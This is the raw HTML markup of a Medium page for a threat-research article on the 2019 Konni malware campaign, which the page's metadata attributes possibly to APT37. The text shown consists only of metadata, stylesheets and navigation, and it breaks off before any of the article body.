<!doctype html><html lang="en"><head><title data-rh="true">Threat Spotlight: Konni Malware 2019 Campaign  | d-hunter</title><meta data-rh="true" charset="utf-8"/><meta data-rh="true" name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1,maximum-scale=1"/><meta data-rh="true" name="theme-color" content="#000000"/><meta data-rh="true" name="twitter:app:name:iphone" content="Medium"/><meta data-rh="true" name="twitter:app:id:iphone" content="828256236"/><meta data-rh="true" property="al:ios:app_name" content="Medium"/><meta data-rh="true" property="al:ios:app_store_id" content="828256236"/><meta data-rh="true" property="al:android:package" content="com.medium.reader"/><meta data-rh="true" property="fb:app_id" content="542599432471018"/><meta data-rh="true" property="og:site_name" content="Medium"/><meta data-rh="true" property="og:type" content="article"/><meta data-rh="true" property="article:published_time" content="2020-01-08T08:50:12.163Z"/><meta data-rh="true" name="title" content="Threat Spotlight: Konni Malware 2019 Campaign  | d-hunter"/><meta data-rh="true" property="og:title" content="A look into Konni 2019 Campaign"/><meta data-rh="true" property="al:android:url" content="medium://p/b45a0f321e9b"/><meta data-rh="true" property="al:ios:url" content="medium://p/b45a0f321e9b"/><meta data-rh="true" property="al:android:app_name" content="Medium"/><meta data-rh="true" name="description" content="Konni is a remote administration tool, observed in the wild since early 2014. The Konni malware family is potentially linked to APT37, a North-Korean cyber espionage group active since 2012"/><meta data-rh="true" property="og:description" content="Konni is a remote administration tool, observed in the wild since early 2014. The Konni malware family is potentially linked to APT37"/><meta data-rh="true" property="og:url" content="https://medium.com/d-hunter/a-look-into-konni-2019-campaign-b45a0f321e9b"/><meta data-rh="true" property="al:web:url" content="https://medium.com/d-hunter/a-look-into-konni-2019-campaign-b45a0f321e9b"/><meta data-rh="true" property="og:image" content="https://miro.medium.com/v2/resize:fit:1200/1*CfSltI6XAjK-X9tb9J2FvQ.png"/><meta data-rh="true" property="article:author" content="https://medium.com/@DoronKarmi"/><meta data-rh="true" name="author" content="Doron Karmi"/><meta data-rh="true" name="robots" content="index,noarchive,follow,max-image-preview:large"/><meta data-rh="true" name="referrer" content="unsafe-url"/><meta data-rh="true" property="twitter:title" content="A look into Konni 2019 Campaign"/><meta data-rh="true" name="twitter:site" content="@DoronKarmi"/><meta data-rh="true" name="twitter:app:url:iphone" content="medium://p/b45a0f321e9b"/><meta data-rh="true" property="twitter:description" content="Konni is a remote administration tool, observed in the wild since early 2014. The Konni malware family is potentially linked to APT37"/><meta data-rh="true" name="twitter:image:src" content="https://miro.medium.com/v2/resize:fit:1200/1*CfSltI6XAjK-X9tb9J2FvQ.png"/><meta data-rh="true" name="twitter:card" content="summary_large_image"/><meta data-rh="true" name="twitter:creator" content="@DoronKarmi"/><meta data-rh="true" name="twitter:label1" content="Reading time"/><meta data-rh="true" name="twitter:data1" content="11 min read"/><link data-rh="true" rel="icon" href="https://miro.medium.com/v2/5d8de952517e8160e40ef9841c781cdc14a5db313057fa3c3de41c6f5b494b19"/><link data-rh="true" rel="search" type="application/opensearchdescription+xml" title="Medium" href="/osd.xml"/><link data-rh="true" rel="apple-touch-icon" sizes="152x152" href="https://miro.medium.com/v2/resize:fill:304:304/10fd5c419ac61637245384e7099e131627900034828f4f386bdaa47a74eae156"/><link data-rh="true" rel="apple-touch-icon" sizes="120x120" href="https://miro.medium.com/v2/resize:fill:240:240/10fd5c419ac61637245384e7099e131627900034828f4f386bdaa47a74eae156"/><link data-rh="true" rel="apple-touch-icon" sizes="76x76" href="https://miro.medium.com/v2/resize:fill:152:152/10fd5c419ac61637245384e7099e131627900034828f4f386bdaa47a74eae156"/><link data-rh="true" rel="apple-touch-icon" sizes="60x60" href="https://miro.medium.com/v2/resize:fill:120:120/10fd5c419ac61637245384e7099e131627900034828f4f386bdaa47a74eae156"/><link data-rh="true" rel="mask-icon" href="https://miro.medium.com/v2/resize:fill:1000:1000/7*GAOKVe--MXbEJmV9230oOQ.png" color="#171717"/><link data-rh="true" rel="preconnect" href="https://glyph.medium.com" crossOrigin=""/><link data-rh="true" id="glyph_preload_link" rel="preload" as="style" type="text/css" href="https://glyph.medium.com/css/unbound.css"/><link data-rh="true" id="glyph_link" rel="stylesheet" type="text/css" href="https://glyph.medium.com/css/unbound.css"/><link data-rh="true" rel="author" href="https://medium.com/@DoronKarmi"/><link data-rh="true" rel="canonical" href="https://medium.com/d-hunter/a-look-into-konni-2019-campaign-b45a0f321e9b"/><link data-rh="true" rel="alternate" href="android-app://com.medium.reader/https/medium.com/p/b45a0f321e9b"/><script data-rh="true" type="application/ld+json">{"@context":"http:\u002F\u002Fschema.org","@type":"NewsArticle","image":["https:\u002F\u002Fmiro.medium.com\u002Fv2\u002Fresize:fit:1200\u002F1*CfSltI6XAjK-X9tb9J2FvQ.png"],"url":"https:\u002F\u002Fmedium.com\u002Fd-hunter\u002Fa-look-into-konni-2019-campaign-b45a0f321e9b","dateCreated":"2020-01-04T19:16:40.442Z","datePublished":"2020-01-04T19:16:40.442Z","dateModified":"2021-12-13T04:18:48.573Z","headline":"Threat Spotlight: Konni Malware 2019 Campaign  | d-hunter","name":"Threat Spotlight: Konni Malware 2019 Campaign  | d-hunter","description":"Konni is a remote administration tool, observed in the wild since early 2014. The Konni malware family is potentially linked to APT37, a North-Korean cyber espionage group active since 2012","identifier":"b45a0f321e9b","author":{"@type":"Person","name":"Doron Karmi","url":"https:\u002F\u002Fmedium.com\u002F@DoronKarmi"},"creator":["Doron Karmi"],"publisher":{"@type":"Organization","name":"d-hunter","url":"https:\u002F\u002Fmedium.com\u002Fd-hunter","logo":{"@type":"ImageObject","width":216,"height":60,"url":"https:\u002F\u002Fmiro.medium.com\u002Fv2\u002Fresize:fit:432\u002F1*TdnwvJX4h5-6-4x8HU600w.png"}},"mainEntityOfPage":"https:\u002F\u002Fmedium.com\u002Fd-hunter\u002Fa-look-into-konni-2019-campaign-b45a0f321e9b"}</script><style type="text/css" data-fela-rehydration="581" data-fela-type="STATIC">html{box-sizing:border-box;-webkit-text-size-adjust:100%}*, *:before, *:after{box-sizing:inherit}body{margin:0;padding:0;text-rendering:optimizeLegibility;-webkit-font-smoothing:antialiased;color:rgba(0,0,0,0.8);position:relative;min-height:100vh}h1, h2, h3, h4, h5, h6, dl, dd, ol, ul, menu, figure, blockquote, p, pre, form{margin:0}menu, ol, ul{padding:0;list-style:none;list-style-image:none}main{display:block}a{color:inherit;text-decoration:none}a, button, input{-webkit-tap-highlight-color:transparent}img, svg{vertical-align:middle}button{background:transparent;overflow:visible}button, input, optgroup, select, textarea{margin:0}:root{--reach-tabs:1;--reach-menu-button:1}#speechify-root{font-family:Sohne, sans-serif}div[data-popper-reference-hidden="true"]{visibility:hidden;pointer-events:none}.grecaptcha-badge{visibility:hidden}
/*XCode style (c) Angel Garcia <angelgarcia.mail@gmail.com>*/.hljs {background: #fff;color: black;
}/* Gray DOCTYPE selectors like WebKit */
.xml .hljs-meta {color: #c0c0c0;
}.hljs-comment,
.hljs-quote {color: #007400;
}.hljs-tag,
.hljs-attribute,
.hljs-keyword,
.hljs-selector-tag,
.hljs-literal,
.hljs-name {color: #aa0d91;
}.hljs-variable,
.hljs-template-variable {color: #3F6E74;
}.hljs-code,
.hljs-string,
.hljs-meta .hljs-string {color: #c41a16;
}.hljs-regexp,
.hljs-link {color: #0E0EFF;
}.hljs-title,
.hljs-symbol,
.hljs-bullet,
.hljs-number {color: #1c00cf;
}.hljs-section,
.hljs-meta {color: #643820;
}.hljs-title.class_,
.hljs-class .hljs-title,
.hljs-type,
.hljs-built_in,
.hljs-params {color: #5c2699;
}.hljs-attr {color: #836C28;
}.hljs-subst {color: #000;
}.hljs-formula {background-color: #eee;font-style: italic;
}.hljs-addition {background-color: #baeeba;
}.hljs-deletion {background-color: #ffc8bd;
}.hljs-selector-id,
.hljs-selector-class {color: #9b703f;
}.hljs-doctag,
.hljs-strong {font-weight: bold;
}.hljs-emphasis {font-style: italic;
}
</style><style type="text/css" data-fela-rehydration="581" data-fela-type="KEYFRAME">@-webkit-keyframes k1{0%{opacity:0.8}50%{opacity:0.5}100%{opacity:0.8}}@-moz-keyframes k1{0%{opacity:0.8}50%{opacity:0.5}100%{opacity:0.8}}@keyframes k1{0%{opacity:0.8}50%{opacity:0.5}100%{opacity:0.8}}</style><style type="text/css" data-fela-rehydration="581" data-fela-type="RULE">.a{font-family:medium-content-sans-serif-font, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif}.b{font-weight:400}.c{background-color:rgba(255, 255, 255, 1)}.l{display:block}.m{position:sticky}.n{top:0}.o{z-index:500}.p{padding:0 24px}.q{align-items:center}.r{border-bottom:solid 1px #F2F2F2}.y{height:41px}.z{line-height:20px}.ab{display:flex}.ac{height:57px}.ae{flex:1 0 auto}.af{color:inherit}.ag{fill:inherit}.ah{font-size:inherit}.ai{border:inherit}.aj{font-family:inherit}.ak{letter-spacing:inherit}.al{font-weight:inherit}.am{padding:0}.an{margin:0}.ao{cursor:pointer}.ap:disabled{cursor:not-allowed}.aq:disabled{color:#6B6B6B}.ar:disabled{fill:#6B6B6B}.au{width:auto}.av path{fill:#242424}.aw{height:25px}.ax{margin-left:16px}.ay{border:none}.az{border-radius:20px}.ba{width:240px}.bb{background:#F9F9F9}.bc path{fill:#6B6B6B}.be{outline:none}.bf{font-family:sohne, "Helvetica Neue", Helvetica, Arial, sans-serif}.bg{font-size:14px}.bh{width:100%}.bi{padding:10px 20px 10px 0}.bj{background-color:transparent}.bk{color:#242424}.bl::placeholder{color:#6B6B6B}.bm{display:inline-block}.bn{margin-left:12px}.bo{margin-right:12px}.bp{border-radius:4px}.bq{margin-left:24px}.br{height:24px}.bx{background-color:#F9F9F9}.by{border-radius:50%}.bz{height:32px}.ca{width:32px}.cb{justify-content:center}.ch{max-width:680px}.ci{min-width:0}.cj{animation:k1 1.2s ease-in-out infinite}.ck{height:100vh}.cl{margin-bottom:16px}.cm{margin-top:48px}.cn{align-items:flex-start}.co{flex-direction:column}.cp{justify-content:space-between}.cq{margin-bottom:24px}.cw{width:80%}.cx{background-color:#F2F2F2}.dd{height:44px}.de{width:44px}.df{margin:auto 0}.dg{margin-bottom:4px}.dh{height:16px}.di{width:120px}.dj{width:80px}.dp{margin-bottom:8px}.dq{width:96%}.dr{width:98%}.ds{width:81%}.dt{margin-left:8px}.du{color:#6B6B6B}.dv{font-size:13px}.dw{height:100%}.ep{color:#FFFFFF}.eq{fill:#FFFFFF}.er{background:rgba(26, 137, 23, 1)}.es{border-color:rgba(26, 137, 23, 1)}.ew:disabled{cursor:inherit !important}.ex:disabled{opacity:0.3}.ey:disabled:hover{background:rgba(26, 137, 23, 1)}.ez:disabled:hover{border-color:rgba(26, 137, 23, 1)}.fa{border-radius:99em}.fb{border-width:1px}.fc{border-style:solid}.fd{box-sizing:border-box}.fe{text-decoration:none}.ff{text-align:center}.fi{margin-right:32px}.fj{position:relative}.fk{fill:#6B6B6B}.fn{background:transparent}.fo svg{margin-left:4px}.fp svg{fill:#6B6B6B}.fr{box-shadow:inset 0 0 0 1px rgba(0, 0, 0, 0.05)}.fs{position:absolute}.fz{margin:0 24px}.gd{background:rgba(255, 255, 255, 1)}.ge{border:1px solid #F2F2F2}.gf{box-shadow:0 1px 4px #F2F2F2}.gg{max-height:100vh}.gh{overflow-y:auto}.gi{left:0}.gj{top:calc(100vh + 100px)}.gk{bottom:calc(100vh + 100px)}.gl{width:10px}.gm{pointer-events:none}.gn{word-break:break-word}.go{word-wrap:break-word}.gp:after{display:block}.gq:after{content:""}.gr:after{clear:both}.gs{line-height:1.23}.gt{letter-spacing:0}.gu{font-style:normal}.gv{font-weight:700}.ia{align-items:baseline}.ib{width:48px}.ic{height:48px}.id{border:2px solid rgba(255, 255, 255, 1)}.ie{z-index:0}.if{box-shadow:none}.ig{border:1px solid rgba(0, 0, 0, 0.05)}.ih{margin-left:-12px}.ii{width:28px}.ij{height:28px}.ik{z-index:1}.il{width:24px}.im{margin-bottom:2px}.in{flex-wrap:nowrap}.io{font-size:16px}.ip{line-height:24px}.ir{margin:0 8px}.is{display:inline}.it{color:rgba(26, 137, 23, 1)}.iu{fill:rgba(26, 137, 23, 1)}.ix{flex:0 0 auto}.ja{flex-wrap:wrap}.jd{white-space:pre-wrap}.je{margin-right:4px}.jf{overflow:hidden}.jg{max-height:20px}.jh{text-overflow:ellipsis}.ji{display:-webkit-box}.jj{-webkit-line-clamp:1}.jk{-webkit-box-orient:vertical}.jl{word-break:break-all}.jn{padding-left:8px}.jo{padding-right:8px}.kp> *{flex-shrink:0}.kq{overflow-x:scroll}.kr::-webkit-scrollbar{display:none}.ks{scrollbar-width:none}.kt{-ms-overflow-style:none}.ku{width:74px}.kv{flex-direction:row}.kw{z-index:2}.kz{-webkit-user-select:none}.la{border:0}.lb{fill:rgba(117, 117, 117, 1)}.le{outline:0}.lf{user-select:none}.lg> svg{pointer-events:none}.lp{cursor:progress}.lq{opacity:1}.lr{padding:4px 0}.lu{margin-top:0px}.lv{width:16px}.lx{display:inline-flex}.md{max-width:100%}.me{padding:8px 2px}.mf svg{color:#6B6B6B}.mw{line-height:1.58}.mx{letter-spacing:-0.004em}.my{font-family:source-serif-pro, Georgia, Cambria, "Times New Roman", Times, serif}.nt{margin-bottom:-0.46em}.nu{text-decoration:underline}.nv{margin-left:auto}.nw{margin-right:auto}.nx{max-width:1823px}.od{clear:both}.of{cursor:zoom-in}.og{z-index:auto}.oi{height:auto}.oj{margin-top:10px}.ok{max-width:728px}.on{font-style:italic}.oo{line-height:1.12}.op{letter-spacing:-0.022em}.oq{font-weight:600}.pl{margin-bottom:-0.28em}.pm{max-width:1785px}.pn{max-width:1760px}.po{margin-top:32px}.pp{margin-bottom:14px}.pq{padding-top:24px}.pr{padding-bottom:10px}.ps{background-color:#000000}.pt{height:3px}.pu{width:3px}.pv{margin-right:20px}.qb{line-height:1.18}.qp{margin-bottom:-0.31em}.qv{max-width:811px}.qw{max-width:472px}.qx{list-style-type:disc}.qy{margin-left:30px}.qz{padding-left:0px}.rf{max-width:1346px}.rg{max-width:753px}.rh{max-width:982px}.ri{max-width:693px}.rj{max-width:528px}.rk{max-width:734px}.rl{max-width:501px}.rm{max-width:773px}.rn{max-width:1239px}.ro{max-width:357px}.rp{max-width:270px}.rq{max-width:330px}.rr{max-width:968px}.rs{max-width:668px}.rt{max-width:490px}.ru{max-width:597px}.rv{max-width:864px}.rw{max-width:420px}.rx{max-width:1365px}.ry{max-width:516px}.rz{max-width:835px}.sf{max-width:1454px}.sg{padding-top:5px}.sh{padding-bottom:5px}.si{max-width:1281px}.sj{max-width:505px}.sk{max-width:821px}.sl{max-width:711px}.sm{max-width:677px}.sn{margin-bottom:26px}.so{margin-top:6px}.sp{margin-top:8px}.sq{margin-right:8px}.sr{padding:8px 16px}.ss{border-radius:100px}.st{transition:background 300ms ease}.sv{white-space:nowrap}.sw{border-top:none}.tc{height:52px}.td{max-height:52px}.te{box-sizing:content-box}.tf{position:static}.th{max-width:155px}.ts{align-items:flex-end}.tt{width:76px}.tu{height:76px}.tv{border:2px solid #F9F9F9}.tw{height:72px}.tx{width:72px}.ty{margin-left:-16px}.tz{width:36px}.ua{height:36px}.ub{color:rgba(255, 255, 255, 1)}.uc{fill:rgba(255, 255, 255, 1)}.ud{background:rgba(25, 25, 25, 1)}.ue{border-color:rgba(25, 25, 25, 1)}.uh:disabled{opacity:0.1}.ui:disabled:hover{background:rgba(25, 25, 25, 1)}.uj:disabled:hover{border-color:rgba(25, 25, 25, 1)}.uk{stroke:#F2F2F2}.ul{color:#F2F2F2}.um{fill:#F2F2F2}.un{background:#F2F2F2}.uo{border-color:#F2F2F2}.uu{font-weight:500}.uv{font-size:24px}.uw{line-height:30px}.ux{letter-spacing:-0.016em}.uy{margin-top:16px}.uz{height:0px}.va{border-bottom:solid 1px #E5E5E5}.vg{margin-top:72px}.vh{padding:24px 0}.vi{margin-bottom:0px}.vj{margin-right:16px}.as:hover:not(:disabled){color:rgba(25, 25, 25, 1)}.at:hover:not(:disabled){fill:rgba(25, 25, 25, 1)}.et:hover{background:rgba(15, 115, 12, 1)}.eu:hover{border-color:rgba(15, 115, 12, 1)}.ev:hover{cursor:pointer}.fl:hover{color:#242424}.fm:hover{fill:#242424}.fq:hover svg{fill:#242424}.ft:hover{background-color:rgba(0, 0, 0, 0.1)}.iq:hover{text-decoration:underline}.iv:hover:not(:disabled){color:rgba(15, 115, 12, 1)}.iw:hover:not(:disabled){fill:rgba(15, 115, 12, 1)}.ld:hover{fill:rgba(8, 8, 8, 1)}.ls:hover{fill:#000000}.lt:hover p{color:#000000}.lw:hover{color:#000000}.mg:hover svg{color:#000000}.su:hover{background-color:#F2F2F2}.uf:hover{background:#000000}.ug:hover{border-color:#242424}.up:hover{background:#F2F2F2}.uq:hover{border-color:#F2F2F2}.ur:hover{cursor:wait}.us:hover{color:#F2F2F2}.ut:hover{fill:#F2F2F2}.bd:focus-within path{fill:#242424}.lc:focus{fill:rgba(8, 8, 8, 1)}.mh:focus svg{color:#000000}.oh:focus{transform:scale(1.01)}.lh:active{border-style:none}</style><style type="text/css" data-fela-rehydration="581" data-fela-type="RULE" media="all and (min-width: 1080px)">.d{display:none}.bw{width:64px}.cg{margin:0 64px}.cv{height:48px}.dc{margin-bottom:52px}.do{margin-bottom:48px}.ef{font-size:14px}.eg{line-height:20px}.em{font-size:13px}.eo{padding:5px 12px}.fh{display:flex}.fy{margin-bottom:68px}.gc{max-width:680px}.hq{font-size:42px}.hr{margin-top:1.19em}.hs{margin-bottom:32px}.ht{line-height:52px}.hu{letter-spacing:-0.011em}.hz{align-items:center}.kb{border-top:solid 1px #F2F2F2}.kc{border-bottom:solid 1px #F2F2F2}.kd{margin:32px 0 0}.ke{padding:3px 8px}.kn> *{margin-right:24px}.ko> :last-child{margin-right:0}.lo{margin-top:0px}.mc{margin:0}.np{font-size:20px}.nq{margin-top:2.14em}.nr{line-height:32px}.ns{letter-spacing:-0.003em}.oc{margin-top:56px}.ph{font-size:24px}.pi{margin-top:1.95em}.pj{line-height:30px}.pk{letter-spacing:-0.016em}.qa{margin-top:1.25em}.qm{margin-top:1.72em}.qn{line-height:24px}.qo{letter-spacing:0}.qu{margin-top:0.94em}.re{margin-top:1.14em}.se{max-width:1192px}.tb{margin-bottom:88px}.tm{display:inline-block}.tr{padding-top:72px}.vf{margin-top:40px}</style><style type="text/css" data-fela-rehydration="581" data-fela-type="RULE" media="all and (max-width: 1079.98px)">.e{display:none}.ln{margin-top:0px}.ol{margin-left:auto}.om{text-align:center}.tl{display:inline-block}</style><style type="text/css" data-fela-rehydration="581" data-fela-type="RULE" media="all and (max-width: 903.98px)">.f{display:none}.lm{margin-top:0px}.tk{display:inline-block}</style><style type="text/css" data-fela-rehydration="581" data-fela-type="RULE" media="all and (max-width: 727.98px)">.g{display:none}.lk{margin-top:0px}.ll{margin-right:0px}.tj{display:inline-block}</style><style type="text/css" data-fela-rehydration="581" data-fela-type="RULE" media="all and (max-width: 551.98px)">.h{display:none}.s{display:flex}.t{justify-content:space-between}.bs{width:24px}.cc{margin:0 24px}.cr{height:40px}.cy{margin-bottom:44px}.dk{margin-bottom:32px}.dx{font-size:13px}.dy{line-height:20px}.eh{padding:0px 8px 1px}.fu{margin-bottom:4px}.gw{font-size:32px}.gx{margin-top:1.01em}.gy{margin-bottom:24px}.gz{line-height:38px}.ha{letter-spacing:-0.014em}.hv{align-items:flex-start}.iy{flex-direction:column}.jb{margin-bottom:2px}.jp{margin:24px -24px 0}.jq{padding:0}.kf> *{margin-right:8px}.kg> :last-child{margin-right:24px}.kx{margin-left:0px}.li{margin-top:0px}.lj{margin-right:0px}.ly{margin:0}.mi{border:1px solid #F2F2F2}.mj{border-radius:99em}.mk{padding:0px 16px 0px 12px}.ml{height:38px}.mm{align-items:center}.mo svg{margin-right:8px}.mz{font-size:18px}.na{margin-top:1.56em}.nb{line-height:28px}.nc{letter-spacing:-0.003em}.ny{margin-top:40px}.or{font-size:20px}.os{margin-top:1.2em}.ot{line-height:24px}.ou{letter-spacing:0}.pw{margin-top:0.93em}.qc{font-size:16px}.qd{margin-top:1.23em}.qq{margin-top:0.67em}.ra{margin-top:1.34em}.sa{max-width:100%}.sx{margin-bottom:80px}.ti{display:inline-block}.tn{padding-top:48px}.vb{margin-top:32px}.mn:hover{border-color:#E5E5E5}</style><style type="text/css" data-fela-rehydration="581" data-fela-type="RULE" media="all and (min-width: 904px) and (max-width: 1079.98px)">.i{display:none}.bv{width:64px}.cf{margin:0 64px}.cu{height:48px}.db{margin-bottom:52px}.dn{margin-bottom:48px}.ed{font-size:14px}.ee{line-height:20px}.ek{font-size:13px}.el{padding:5px 12px}.fg{display:flex}.fx{margin-bottom:68px}.gb{max-width:680px}.hl{font-size:42px}.hm{margin-top:1.19em}.hn{margin-bottom:32px}.ho{line-height:52px}.hp{letter-spacing:-0.011em}.hy{align-items:center}.jx{border-top:solid 1px #F2F2F2}.jy{border-bottom:solid 1px #F2F2F2}.jz{margin:32px 0 0}.ka{padding:3px 8px}.kl> *{margin-right:24px}.km> :last-child{margin-right:0}.mb{margin:0}.nl{font-size:20px}.nm{margin-top:2.14em}.nn{line-height:32px}.no{letter-spacing:-0.003em}.ob{margin-top:56px}.pd{font-size:24px}.pe{margin-top:1.95em}.pf{line-height:30px}.pg{letter-spacing:-0.016em}.pz{margin-top:1.25em}.qj{margin-top:1.72em}.qk{line-height:24px}.ql{letter-spacing:0}.qt{margin-top:0.94em}.rd{margin-top:1.14em}.sd{max-width:1192px}.ta{margin-bottom:88px}.tq{padding-top:72px}.ve{margin-top:40px}</style><style type="text/css" data-fela-rehydration="581" data-fela-type="RULE" media="all and (min-width: 728px) and (max-width: 903.98px)">.j{display:none}.w{display:flex}.x{justify-content:space-between}.bu{width:64px}.ce{margin:0 48px}.ct{height:48px}.da{margin-bottom:52px}.dm{margin-bottom:48px}.eb{font-size:13px}.ec{line-height:20px}.ej{padding:0px 8px 1px}.fw{margin-bottom:68px}.ga{max-width:680px}.hg{font-size:42px}.hh{margin-top:1.19em}.hi{margin-bottom:32px}.hj{line-height:52px}.hk{letter-spacing:-0.011em}.hx{align-items:center}.jt{border-top:solid 1px #F2F2F2}.ju{border-bottom:solid 1px #F2F2F2}.jv{margin:32px 0 0}.jw{padding:3px 8px}.kj> *{margin-right:24px}.kk> :last-child{margin-right:0}.ma{margin:0}.nh{font-size:20px}.ni{margin-top:2.14em}.nj{line-height:32px}.nk{letter-spacing:-0.003em}.oa{margin-top:56px}.oz{font-size:24px}.pa{margin-top:1.95em}.pb{line-height:30px}.pc{letter-spacing:-0.016em}.py{margin-top:1.25em}.qg{margin-top:1.72em}.qh{line-height:24px}.qi{letter-spacing:0}.qs{margin-top:0.94em}.rc{margin-top:1.14em}.sc{max-width:100%}.sz{margin-bottom:88px}.tp{padding-top:72px}.vd{margin-top:40px}</style><style type="text/css" data-fela-rehydration="581" data-fela-type="RULE" media="all and (min-width: 552px) and (max-width: 727.98px)">.k{display:none}.u{display:flex}.v{justify-content:space-between}.bt{width:24px}.cd{margin:0 24px}.cs{height:40px}.cz{margin-bottom:44px}.dl{margin-bottom:32px}.dz{font-size:13px}.ea{line-height:20px}.ei{padding:0px 8px 1px}.fv{margin-bottom:4px}.hb{font-size:32px}.hc{margin-top:1.01em}.hd{margin-bottom:24px}.he{line-height:38px}.hf{letter-spacing:-0.014em}.hw{align-items:flex-start}.iz{flex-direction:column}.jc{margin-bottom:2px}.jr{margin:24px 0 0}.js{padding:0}.kh> *{margin-right:8px}.ki> :last-child{margin-right:8px}.ky{margin-left:0px}.lz{margin:0}.mp{border:1px solid #F2F2F2}.mq{border-radius:99em}.mr{padding:0px 16px 0px 12px}.ms{height:38px}.mt{align-items:center}.mv svg{margin-right:8px}.nd{font-size:18px}.ne{margin-top:1.56em}.nf{line-height:28px}.ng{letter-spacing:-0.003em}.nz{margin-top:40px}.ov{font-size:20px}.ow{margin-top:1.2em}.ox{line-height:24px}.oy{letter-spacing:0}.px{margin-top:0.93em}.qe{font-size:16px}.qf{margin-top:1.23em}.qr{margin-top:0.67em}.rb{margin-top:1.34em}.sb{max-width:100%}.sy{margin-bottom:80px}.to{padding-top:48px}.vc{margin-top:32px}.mu:hover{border-color:#E5E5E5}</style><style type="text/css" data-fela-rehydration="581" data-fela-type="RULE" media="print">.tg{display:none}</style><style type="text/css" data-fela-rehydration="581" data-fela-type="RULE" media="(orientation: landscape) and (max-width: 903.98px)">.jm{max-height:none}</style><style type="text/css" data-fela-rehydration="581" data-fela-type="RULE" media="(prefers-reduced-motion: no-preference)">.oe{transition:transform 300ms cubic-bezier(0.2, 0, 0.2, 1)}</style></head><body><div id="root"><div class="a b c"><div class="d e f g h i j k"></div><script>document.domain = document.domain;</script><div class="l c"><div class="l m n o c"><div class="p q r s t u v w x i d y z"><a class="du ag dv bf ak b am an ao ap aq ar as at s u w i d q dw z" href="https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2Fb45a0f321e9b&amp;%7Efeature=LoOpenInAppButton&amp;%7Echannel=ShowPostUnderCollection&amp;source=---top_nav_layout_nav----------------------------------" rel="noopener follow">Open in app<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10" fill="none" viewBox="0 0 10 10" class="dt"><path fill="currentColor" d="M.985 8.485a.375.375 0 1 0 .53.53zM8.75 1.25h.375A.375.375 0 0 0 8.75.875zM8.375 6.5a.375.375 0 1 0 .75 0zM3.5.875a.375.375 0 1 0 0 .75zm-1.985 8.14 7.5-7.5-.53-.53-7.5 7.5zm6.86-7.765V6.5h.75V1.25zM3.5 1.625h5.25v-.75H3.5z"></path></svg></a><div class="ab q"><p class="bf b dx dy dz ea eb ec ed ee ef eg du"><span><button class="bf b dx dy eh dz ea ei eb ec ej ek ee el em eg eo ep eq er es et eu ev ew ex ey ez fa fb fc fd bm fe ff" data-testid="headerSignUpButton">Sign up</button></span></p><div class="ax l"><p class="bf b dx dy dz ea eb ec ed ee ef eg du"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerSignInButton" rel="noopener follow" href="/m/signin?operation=login&amp;redirect=https%3A%2F%2Fmedium.com%2Fd-hunter%2Fa-look-into-konni-2019-campaign-b45a0f321e9b&amp;source=post_page---top_nav_layout_nav-----------------------global_nav-----------">Sign in</a></span></p></div></div></div><div class="p q r ab ac"><div class="ab q ae"><a class="af ag ah ai aj ak al am an ao ap aq ar as at ab" aria-label="Homepage" data-testid="headerMediumLogo" rel="noopener follow" href="/?source=---top_nav_layout_nav----------------------------------"><svg xmlns="http://www.w3.org/2000/svg" width="719" height="160" fill="none" viewBox="0 0 719 160" class="au av aw"><path fill="#242424" d="m174.104 9.734.215-.047V8.02H130.39L89.6 103.89 48.81 8.021H1.472v1.666l.212.047c8.018 1.81 12.09 4.509 12.09 14.242V137.93c0 9.734-4.087 12.433-12.106 14.243l-.212.047v1.671h32.118v-1.665l-.213-.048c-8.018-1.809-12.089-4.509-12.089-14.242V30.586l52.399 123.305h2.972l53.925-126.743V140.75c-.687 7.688-4.721 10.062-11.982 11.701l-.215.05v1.652h55.948v-1.652l-.215-.05c-7.269-1.639-11.4-4.013-12.087-11.701l-.037-116.774h.037c0-9.733 4.071-12.432 12.087-14.242m25.555 75.488c.915-20.474 8.268-35.252 20.606-35.507 3.806.063 6.998 1.312 9.479 3.714 5.272 5.118 7.751 15.812 7.368 31.793zm-.553 5.77h65.573v-.275c-.186-15.656-4.721-27.834-13.466-36.196-7.559-7.227-18.751-11.203-30.507-11.203h-.263c-6.101 0-13.584 1.48-18.909 4.16-6.061 2.807-11.407 7.003-15.855 12.511-7.161 8.874-11.499 20.866-12.554 34.343q-.05.606-.092 1.212a50 50 0 0 0-.065 1.151 85.807 85.807 0 0 0-.094 5.689c.71 30.524 17.198 54.917 46.483 54.917 25.705 0 40.675-18.791 44.407-44.013l-1.886-.664c-6.557 13.556-18.334 21.771-31.738 20.769-18.297-1.369-32.314-19.922-31.042-42.395m139.722 41.359c-2.151 5.101-6.639 7.908-12.653 7.908s-11.513-4.129-15.418-11.63c-4.197-8.053-6.405-19.436-6.405-32.92 0-28.067 8.729-46.22 22.24-46.22 5.657 0 10.111 2.807 12.236 7.704zm43.499 20.008c-8.019-1.897-12.089-4.722-12.089-14.951V1.309l-48.716 14.353v1.757l.299-.024c6.72-.543 11.278.386 13.925 2.83 2.072 1.915 3.082 4.853 3.082 8.987v18.66c-4.803-3.067-10.516-4.56-17.448-4.56-14.059 0-26.909 5.92-36.176 16.672-9.66 11.205-14.767 26.518-14.767 44.278-.003 31.72 15.612 53.039 38.851 53.039 13.595 0 24.533-7.449 29.54-20.013v16.865h43.711v-1.746zM424.1 19.819c0-9.904-7.468-17.374-17.375-17.374-9.859 0-17.573 7.632-17.573 17.374s7.721 17.374 17.573 17.374c9.907 0 17.375-7.47 17.375-17.374m11.499 132.546c-8.019-1.897-12.089-4.722-12.089-14.951h-.035V43.635l-43.714 12.551v1.705l.263.024c9.458.842 12.047 4.1 12.047 15.152v81.086h43.751v-1.746zm112.013 0c-8.018-1.897-12.089-4.722-12.089-14.951V43.635l-41.621 12.137v1.71l.246.026c7.733.813 9.967 4.257 9.967 15.36v59.279c-2.578 5.102-7.415 8.131-13.274 8.336-9.503 0-14.736-6.419-14.736-18.073V43.638l-43.714 12.55v1.703l.262.024c9.459.84 12.05 4.097 12.05 15.152v50.17a56.3 56.3 0 0 0 .91 10.444l.787 3.423c3.701 13.262 13.398 20.197 28.59 20.197 12.868 0 24.147-7.966 29.115-20.43v17.311h43.714v-1.747zm169.818 